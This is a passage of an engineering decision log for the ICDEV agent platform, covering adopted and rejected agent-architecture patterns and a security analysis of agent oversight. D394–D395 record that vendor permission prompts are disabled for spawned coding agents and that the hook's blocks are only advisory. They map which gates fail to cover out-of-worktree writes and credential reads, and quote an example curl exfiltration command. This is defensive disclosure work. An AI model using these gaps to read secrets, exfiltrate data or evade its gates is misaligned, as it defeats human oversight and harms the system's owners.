- **D390:** **Email = GO, Discord = NO-GO (sag-gw-02 spike).** Email fits the pure-Python/offline preference (stdlib `imaplib`/`smtplib`, no new dependency, air-gap capable) and is the only channel reaching disconnected IL5/IL6 enclaves with a self-hosted mail server. Discord was rejected: `discord.py` is a heavyweight async gateway/websocket dependency that cannot run air-gapped and overlaps the shipped Telegram/Slack channels; if demand appears, build the dependency-free webhook-*Interactions* (Ed25519) variant, not `discord.py`. Email is polled (no webhook HMAC — `verify_signature` returns not-applicable); sender authenticity rests on the authenticated IMAP mailbox + the identity-binding gate on `From`. `docs/spikes/sag-gw-02-discord-email-adapters.md`, sandbox-coverage Gap 34.

### Phase 77 — AGX (Agentic Architectures Adaptation)

Adapt the *patterns* — not the stack — of [github.com/FareedKhan-dev/all-agentic-architectures](https://github.com/FareedKhan-dev/all-agentic-architectures) (MIT, Copyright (c) 2025 Fareed Khan). **ICDEV vendors NO upstream code; it adapts patterns and credits the source in the ADR and in every `tools/llm/architectures/` module docstring.** The governing discipline mirrors the SAG phase — *compose existing primitives, don't rebuild*: 22 of the 35 upstream architectures already ship in ICDEV, so the card built only the genuine gaps behind ONE uniform registry (`tools/llm/architectures/`, agx-core-01) and graded them with a measured benchmark rather than intuition. Supersedes the analysis spike `docs/spikes/agx-00-agentic-architectures-adaptation.md`.

- **D391:** **Disposition of all 35 upstream architectures — ALREADY-COVERED (22) / ADOPTED (7 + 4 enablers) / REJECTED (6).** Recorded here so no future session re-analyzes the upstream repo or re-proposes a rejected pattern. Two engineering practices — the uniform envelope + registry, and the benchmark leaderboard — were the real prizes; the individual gap architectures plug into the registry. The committed `args/llm_config.yaml` `architectures:` routing block stays **all-null (current behavior, a verified no-op)**: agx-bench-02 produces an evidence-based *recommendation* for a human to apply, and never autonomously flips a platform-wide default.

  **ADOPTED — built behind the registry (uniform `run(task) -> ArchitectureResult` envelope):**

  | # | Upstream architecture | AGX task | ICDEV module / registered name |
  |---|---|---|---|
  | — | Uniform envelope + registry (the enabler) | agx-core-01 | `tools/llm/architectures/` (`envelope.py`, `registry.py`, `adapters.py`) |
  | — | LLM-agnostic conformance contract | agx-core-02 | `test_architecture_agnosticism.py` gate (no vendor SDK, no hardcoded model) |
  | — | Config-driven selection (evidence → routing by config, not code) | agx-core-03 | `selection.py` (`resolve_architecture`; shipped all-null = current behavior) |
  | — | Deterministic-picker discipline (LLM commits to a small enum; Python composes the number) | agx-pick-01/02 | audit + conversion of top LLM-as-scorer surfaces; `fitness.py` categorical judge |
  | 3 | Chain-of-Verification (CoVe) | agx-verify-01 | `cove.py` `chain_of_verification` + `cove_guard.py` promote/export gate |
  | 5 | Constitutional AI (per-rule critique + targeted revision) | agx-verify-02 | `constitutional_ai` |
  | 24 | Plan-Execute-Verify (per-step verification, not end-of-run) | agx-verify-03 | step verification for the kanban runner |
  | 14 | Adaptive RAG (pre-route by query complexity) | agx-rag-01 | adaptive RAG complexity pre-routing |
  | 13 | Self-RAG (per-document reflective reranking) | agx-rag-02 | reflective reranker |
  | 4 | Self-Discover (SELECT→ADAPT→IMPLEMENT→SOLVE reasoning structure) | agx-search-01 | `self_discover.py` (module bank `context/reasoning_modules/`) |
  | 7 | Tree of Thoughts (budget-capped beam search) | agx-search-02 | `tree_of_thoughts.py` (hard `max_llm_calls` ceiling; OPT-IN, never default) |
  | — | Benchmark leaderboard (bake-off + evidence-based routing) | agx-bench-01/02 | `benchmark.py`, `leaderboard.py`, `baseline.py` (reference); results → `data/agx/` |

  **ALREADY-COVERED — do NOT rebuild (22 + 2 near-covered), ICDEV equivalent named:** Reflection (`ChainOrchestrator.invoke_chain_of_thought`); Reflexion (`reflexion_agent.py`/`nova/reflexion_loop.py`); Self-Consistency (`ChainPrompts.self_consistency_voter`); Ensemble (`invoke_council` + `router.get_diverse_models`); Agentic RAG (`mcp/rag_server.py`); Corrective RAG (`rag/corrective_rag.py`, partial); GraphRAG (`knowledge_graph/graph_rag.py`); Episodic+Semantic memory (`tools/memory/` + `kg_edges`); Graph Memory (KG triples); MemGPT (`context_compressor.py` + `agent_loop` compression, partial); Voyager *skill-learning* (NOVA `skill_generator.py` + HITL `skills_lifecycle`); Agent Workflow Memory (Kanban Lessons Learned Engine); Tool Use (`agent_loop` + `discovery.py`); ReAct (`agent_loop.run_agent_loop`); Planning (`workflow_planner`, ANVIL Architect/Navigate); SWE-Agent (`sandbox_execute` + `mutating_tools` + `checkpoints`); BrowserAgent (Playwright MCP + `tools/browser/`); Multi-Agent (16 A2A agents + ACE); Debate (`invoke_chain_of_debate`); STORM (Industry Research Engine, partial); Meta-Controller (`intent_classifier` + ACE Oracle, partial); Dry-Run (`safety.py` SafetyGate + `--dry-run`); near-covered: Reflexive Metacognitive (`ace/trust_calibrator.py`), RLHF Self-Improvement (`fitness.py` + GEPA).

  **REJECTED — with reasons:**

  | # | Architecture | Reason |
  |---|---|---|
  | — | **LangGraph / LangChain stack** | Adopt patterns, not the stack. `requirements.txt` is deliberately lean and must run air-gapped from vendored wheels; ICDEV already owns the primitives (`agent_loop` for state, `ChainOrchestrator` for multi-model). LangGraph would also smuggle in a provider abstraction that competes with `LLMRouter`. |
  | 35 | **Cellular Automata** | LLM rules over a grid. No ICDEV use case. Notebook curiosity. |
  | 8 | **LATS (MCTS + reward propagation)** | Monte Carlo tree search multiplies LLM calls per node; cost not defensible vs ToT-with-beam-cap, which captures most of the benefit. Revisit only if ToT proves its worth and cost lands. |
  | 19 | **Voyager — subprocess execution of LLM-written Python** | Non-starter at IL4+. ICDEV's HITL-gated skill promotion (`skills_lifecycle.approve_proposal` as sole writer, `trust: unverified-llm-generated` frontmatter, `invoke.py` allowlist) is the correct shape and stays. (The skill-*learning* pattern is ALREADY-COVERED above; only the execution *mechanism* is rejected.) |
  | 9 | **Mental Loop** (new-work eval) | "Simulate then deterministic-pick" is already the Digital Program Twin + `run_monte_carlo` + the twin-core canonical envelope. A second simulate-then-pick surface adds no capability. |
  | 28 | **Blackboard** (new-work eval) | ACE `coworker_thread` shared state + `tools/canvas/` bus already cover the shared-workspace need; a second concurrency model adds risk without capability. |

### Phase 78 — DVG (Divergent Ideation)

Adapt the *idea* — a deliberate generative "widen then judge" step — from the ADHD-agent divergent-ideation project (npm/adhd-agent CLI + TypeScript library), **not** its stack. The governing discipline is the same as the SAG and AGX phases — *compose existing primitives, don't rebuild*: **~70% of the orchestration was already present in `ChainOrchestrator.invoke_council`** (parallel multi-branch fan-out, per-branch model assignment via `get_diverse_models`, budget/timeout caps, telemetry, graceful degrade). DVG added only the two genuine deltas — strict branch isolation with generative (non-evaluative) prompts, and a separate opposing critic pass — plus config-driven frames, trap detection, clustering, opt-in engine branch points, and a measured benchmark. ICDEV vendors NO upstream code. Source analysis: `docs/spikes/dvg-00-adhd-divergent-ideation-adaptation.md`.

- **D392:** **Disposition of the ADHD-agent divergent-ideation adaptation — ADOPTED (7) / REJECTED (7).** Recorded here so no future session re-analyzes the upstream project or re-proposes a rejected shape. The prize was the *method* (isolated generative fan-out + an opposing deterministic-first critic), which slots onto the existing chain-orchestration and categorical-scoring spines; the CLI/library/agent-swarm packaging was discarded. Divergence ships **OFF by default everywhere** — it is never a default generation path, and `chain_orchestration.divergence.enabled` plus every engine-level toggle default `false`.

  **ADOPTED — built on the existing chain-orchestration + categorical-scoring spines:**

  | Adopted pattern | DVG task | ICDEV module / surface |
  |---|---|---|
  | Config-driven generative frame library (frames are data, not code) | dvg-frames-01 | `args/ideation_frames.yaml` + `tools/config/ideation_frames.py` |
  | Strictly-isolated generative divergence as a fourth chain mode (one round, no cross-reading, no self-critique) | dvg-core-01 | `ChainOrchestrator.invoke_divergence` (`chain_mode="divergence"`) |
  | Separate critic pass — novelty/viability/fit, categorical enums, Python-composed ordering | dvg-critic-01 | `tools/quality/divergence_critic.py` `score_idea_pool` (reuses `categorical_scoring.compose_divergence`) |
  | Explicit trap detection (seductive-but-broken flag + mandatory rationale) — ADVISORY | dvg-critic-02 | `compose_trap` / `IdeaScore.is_trap` / `ScoredPool.trap_warnings()` |
  | Cluster + deepen top-K (collapse restatements; expand only the survivors) | dvg-critic-03 | `cluster_pool` / `cluster_and_deepen` → `DeepenedCluster` |
  | Opt-in engine branch points (default-OFF; deterministic path stays the default) | dvg-wire-01/02 | creative `stage_generate` (`divergence_branch.py`); innovation `generate_solution_spec` (alternatives-before-blueprint) |
  | MCP tool + skill + measured benchmark | dvg-wire-04 / dvg-bench-01 | `divergence_invoke` MCP tool; `icdev-divergence` skill; `tools/creative/divergence_benchmark.py` |

  **REJECTED — with reasons:**

  | Rejected | Reason |
  |---|---|
  | **The npm package** | Node/npm runtime — cannot run air-gapped from vendored wheels; `requirements.txt` is deliberately lean and pure-Python. Adopt the pattern, not the stack. |
  | **The adhd-agent CLI** | A standalone external CLI duplicates orchestration ICDEV already owns (`ChainOrchestrator`); nothing to integrate, everything to maintain. |
  | **The TypeScript library** | Wrong language/stack; would fork the LLM-invocation path away from `LLMRouter` and the categorical-scoring discipline. |
  | **The 50+-agent install shims** | Unbounded install/agent surface conflicts with the lean-dependency + air-gap constraints and the 16-agent A2A topology; no capability the frame set + `get_diverse_models` does not already give. |
  | **Replacing CoD or Council** | `invoke_chain_of_debate` (adversarial convergence) and `invoke_council` (consensus) already own the *evaluative* modes. Divergence is generative-only and STRICTLY isolated — it complements them; collapsing them into one mode would destroy the isolation that makes divergence work. |
  | **Making divergence a default path** | Cost is the headline risk (~5–10× a direct answer: N branches + critic + deepen). It ships OFF by default; dvg-bench-01 measures breadth/novelty/trap at fixed model + token cost, and enabling any branch point stays a human decision informed by that evidence — never an auto-flip. |
  | **Unbounded agent fan-out** | Branch count is hard-capped by the frame-set size (`num_branches = min(cfg, len(frames))`) and gated by the module budget/timeout caps that trip *before* any model call — no runaway swarm. |

- **D393:** **Wiring is opt-in and measurement gates enablement; trap detection stays advisory.** The two engine branch points (dvg-wire-01 creative `stage_generate`, dvg-wire-02 innovation `generate_solution_spec`) are **additive branches, not replacements**: when their config toggle is off — the default — the deterministic template / single-blueprint path is byte-for-byte unchanged, and both degrade cleanly back to it when the chain is disabled or the LLM is unreachable. wire-01 persists the divergence `trace_id` on the generated spec (recoverable provenance) and carries surviving clusters into it; wire-02 records the **chosen + rejected** approaches in the existing `_audit` trail (the rejected alternatives are the review value) and visibly marks trap-flagged approaches. dvg-bench-01 (`tools/creative/divergence_benchmark.py`, tasks in `args/creative/divergence_benchmark_tasks.yaml`, results in `data/divergence/`) re-measures the comparison on real ICDEV functions holding the model fixed and reporting token cost — **adopting upstream's measurement method, not its unreproduced 1.9×/2.9×/5.2× figures**. It is RECOMMEND-ONLY: it flips no default, and promotion of trap detection from advisory to gating remains a separate human decision requiring a larger measured sample. Follows the agx-bench-01 harness pattern (honest `unmeasured` cells air-gapped; never requires live models to build/test/merge) so the two benchmarks are comparable.

- **D394:** **`--dangerously-skip-permissions` is KEPT, and the vendor prompt is therefore not a control ICDEV has.** `tools/agents/adapters/claude_cli.py` disables the vendor permission system on every autonomous build, because the adapter's whole purpose is non-interactive dispatch: `spawn()` hands the child a temp file on stdin and returns a `Popen` for the kanban runner's poll/kill loop, and a permission prompt in that path does not make the build safer — it makes it hang until the timeout kills it, which is a liveness failure that reads as a safety control only until the first time it fires. Two consequences are accepted explicitly rather than left implicit. (1) `.claude/settings.json`'s `permissions.deny` list is **not** a second line of defence — the permission system is what evaluates it and the flag turns that system off; the list is best read as a precise inventory of what is given up. (2) The two gates usually named as the compensating controls — `tools/agent_runtime/approval_gate.py` and `tools/studio/executors/agent_tool_gate.py` — are PreToolUse hooks for ICDEV's **in-process** agent loop, wired only by `tools/studio/executors/agent_executor.py`; `claude_cli` `Popen`s a **separate** Claude Code process that imports neither (`grep -rn "approval_gate\|agent_tool_gate" tools/agents/` returns nothing). For the spawned CLI the only ICDEV code observing a tool call is `.claude/hooks/pre_tool_use.py`, which `.claude/settings.json` wires as `python ... || true` — and a PreToolUse hook signals "block" with exit code 2, so every hard block that file advertises is advisory (filed `exa-bench-05`; not fixed here, because deleting `|| true` converts nine never-load-tested checks into hard blocks for every concurrent session on the host at once). Write-up: `docs/security/agent-vendor-permission-bypass.md`. Task: exa-bench-04.

- **D395:** **The compensating controls are measured per category, and two categories are open findings — filed, not accepted.** "The ICDEV gate covers it" is the plausible answer and it is only two-thirds right, so the four categories a vendor prompt interposes on are probed and pinned in `tests/test_skip_permissions_compensating_controls.py`. The bar is *per-call* mediation, because that is what a prompt gives: `agent_tool_gate` refusals qualify, but its `requires_approval` parks **one gate per `(run, tool)`** (`approval_step_id("write_file")` is `approval:agent:write_file` whatever the path), which does not. **Destructive shell** is COVERED per call by the `irreversible` patterns plus `default_tier: unknown`. **Network egress** is COVERED — but by the fail-closed default, not by an egress rule: a GET exfil (`curl https://x/?d=secret`) matches no pattern and halts only because it lands in `unknown` (`exa-bench-08` tracks that fragility). **Writes outside the worktree** are NOT COVERED: gated by name once per run and then auto-allowed at tier `recoverable` for any path, so approving write #1 approves write #2 anywhere (`exa-bench-07`; the `touch`/`mkdir` downgrade patterns are the same hole via `run_command`). **Credential access** is NOT COVERED at all: `read_file` is allowlisted with no gate and `classify()` rule 0 exempts a `reversible` non-executor from **all** content escalation, so no argument can ever escalate a read — a private key classifies exactly like a docstring (`exa-bench-09`). Both gaps are structural rather than oversights: `write_file` is `recoverable` *because git restores it* (true only inside the repo), and `read_file`'s exemption is a correct fix for escalation-by-incidental-text that is also total. Closing them means adding a **path** dimension to a classifier that is name-and-content only — a design change, not a policy edit. The test fails on a regression **and** on an unrecorded fix, so a gap cannot be closed while the write-up still lists it. Task: exa-bench-04.

- **D396:** **Every guardrail ICDEV has verifies STRUCTURE; none verifies DISCRIMINATION — and a check that cannot fail carries zero bits.** The coherence checker asks whether a file exists, a pattern appears, two schemas agree. Code review asks whether the diff matches the intent. The ANVIL verify phase asks whether what was built is what was asked for. All three answer *"is the artifact shaped correctly?"*. **None answers "would this check have failed if the system were broken?"** — so a green check is treated as evidence when it may carry no information at all. Measured on 2026-08-14 in a single session: seven checks that were correctly written, reviewed and gated turned out to be worthless. `tests/cortex/test_chat_routing.py` asserted deterministic routing while `intent_router.route()` made a live Ollama call, so the verdict depended on whether a model server was up; it passed in a whole-directory run and failed alone. Four fixtures registered a blueprint onto the shared `tools.dashboard.app` singleton behind an `if "x" not in app.blueprints` guard that skips only when the blueprint is ALREADY present — i.e. never in the case that fails — so Flask's setup lock made the outcome a function of module ordering. `tests/test_app.py` asserted `200` and got `401` because its fixture never logged in, invisible because the file was ungated. `MINIMAL_ICDEV_SCHEMA`'s `kanban_tasks` lacked the `classification` column the RLS predicate filters on, so every read through `get_connection()` raised and the test **skipped itself** as "SQLite test DB lacks platform schema" — a vacuous pass reported as coverage. The sharpest case was written while fixing the others: a test asserting that `check_project_card_coverage` *"degrades honestly when the board is unreachable"* passed locally **because the unpatched call raised** — the monkeypatch had landed on `tools.db.storage` while the checker resolved `icdev.tools.db.storage`, two distinct module objects with distinct function objects. CI caught it only because CI's environment differs; had CI's database also lacked that table it would be gated and green forever, protecting nothing. This is structural rather than careless: **the author of a check is the worst-placed party to judge its discriminating power**, because the check was written to match their mental model and is run in the environment where that model holds.

- **D397:** **The mechanism that would catch this already exists, is written down correctly, and has zero production callers — the signature defect applied to its own antidote.** `tools/security/reproduction_validator.py` states the rule in as many words: *"`verify_discrimination` is the empirical proof required by this task: the same reproduction must fire against the vulnerable target and must **stop** firing once the fix is applied. Only then is `discriminating` set."* Its three MCP tools are all flagged inert in `tools/mcp/tool_registry.py` (`finding_replay: False`, `finding_enforce_reproduction: False`, `finding_verify_discrimination: False`), and `grep` finds no caller outside the module and its registry entry. Scope is a fair caveat — it replays HTTP against an allowlisted target, so it is not a drop-in for unit tests — but the **principle** is the asset and the principle is unwired. The same gap has a second form in ANVIL: the process mandates RED→GREEN, and nothing anywhere **records the RED**. A process instruction whose evidence is never captured is the `|| true` failure again (D394/exa-bench-05) — the rule is stated, the artifact proving it fired is absent, and no reader can distinguish a check that ran from one that did not. **Decision:** discrimination evidence becomes an artifact, not an instruction. A changed or added test must be shown to FAIL against the pre-change tree; every changed test file runs both alone and in-suite so an order-dependent pass is caught where it is created; a skip in CI is counted as an unmeasured test rather than a passing one; and a substrate is probed for rows before work is designed against it (`kg_ontology` had 0 rows, its upstream `ontology_subclass_closure` had 0 rows, and an approved plan described the pair as a working SHACL-lite). Calibration, stated deliberately so this is not read as a general indictment: the structural layer is strong and caught six real defects the same day — shim/canonical parity caught an unmirrored `schemas.py`, migration-version uniqueness caught an untracked migration directory, publish-gate parity caught constant/migration/schema drift, `task_factory` refused a gate-shaped task id while it was still a keystroke, the PreToolUse hook blocked a `.env` copy, and CI caught the dishonest test above. The blind spot is narrow and precise: **ICDEV measures that its checks exist, never that they discriminate.** Tasks: trust-disc-01..06.
